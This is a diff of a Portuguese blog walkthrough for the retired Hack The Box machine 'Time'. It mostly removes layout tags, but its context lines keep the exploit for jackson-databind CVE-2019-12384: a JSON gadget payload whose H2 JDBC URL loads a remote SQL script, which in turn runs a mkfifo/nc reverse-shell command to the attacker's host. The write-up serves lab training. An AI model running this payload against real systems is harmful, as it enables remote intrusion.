@@ -18,12 +18,12 @@ title: 'Walktrough: HTB Time'
 ---
 Olá pessoal!
 
-A máquina desta semana será **Time**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu), criada por [egotisticalSW](https://app.hackthebox.eu/users/94858) e [felamos](https://app.hackthebox.eu/users/27390).<!--more-->
+A máquina desta semana será **Time**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu), criada por [egotisticalSW](https://app.hackthebox.eu/users/94858) e [felamos](https://app.hackthebox.eu/users/27390). [more]
 
 :information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-{: .notice--info}
 
-![HTB Time](https://i.imgur.com/mJmeefG.png){: .align-center}
+
+![HTB Time](https://i.imgur.com/mJmeefG.png)
 
 ## Enumeração
 
@@ -55,7 +55,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 
 Iniciando a verificação pelo serviço HTTP que executa na porta 80, vemos que temos um serviço de validação e formatação de arquivo JSON
 
-![Online JSON Parser - Time](https://i.imgur.com/V6RbC9L.png){: .align-center}
+![Online JSON Parser - Time](https://i.imgur.com/V6RbC9L.png)
 
 Após executar algumas enumerações utilizando `whatweb` e `nikto` não encontrei nada útil, logo parti para a enumeração da aplicação buscando por alguma vulnerabilidade de injeção de código ou LFI.
 
@@ -63,7 +63,7 @@ Analisando a aplicação temos duas funcionalidades: **Beautify** e **Validate**
 
 - A opção **beautify**, ao receber um JSON válido, o formata de forma "bonita" e, ao enviar um request inválido (por exemplo "test"), retorna o valor `null`.
 
-![Online JSON Parser - Time - beautify](https://i.imgur.com/tpO2p3r.png){: .align-center}
+![Online JSON Parser - Time - beautify](https://i.imgur.com/tpO2p3r.png)
 
 - Já a opção em beta **validate** verifica a sintaxe do JSON fornecido. Quando enviamos um request inválido (por exemplo "test"), exceção não esperada da aplicação é exibida.
 
@@ -77,7 +77,7 @@ Ao buscar por `com.fasterxml.jackson.core` encontrei detalhes sobre o projeto **
 
 Pesquisando por CVEs para o jackson-databind, os seguintes foram encontrados para execução de código em 2019, de acordo com o site [CVE Details](https://www.cvedetails.com):
 
-![CVE Details](https://i.imgur.com/T2Kth6e.png){: .align-center}
+![CVE Details](https://i.imgur.com/T2Kth6e.png)
 
 Dos 4 itens listados, encontrei para o **CVE-2019-12384** um PoC funcional [neste blog](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html), o qual utilizei para obter o acesso inicial. Os seguintes passos foram executados para obter um shell reverso:
 
@@ -99,9 +99,9 @@ CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'"}]
 ```
 
-![Listener and Webserver - Time](https://i.imgur.com/7o42urH.png){: .align-center}
+![Listener and Webserver - Time](https://i.imgur.com/7o42urH.png)
 
-![Online Json Parser - Sending the payload](https://i.imgur.com/Pv2Vbzy.png){: .align-center}
+![Online Json Parser - Sending the payload](https://i.imgur.com/Pv2Vbzy.png)
 
 ## User flag
 
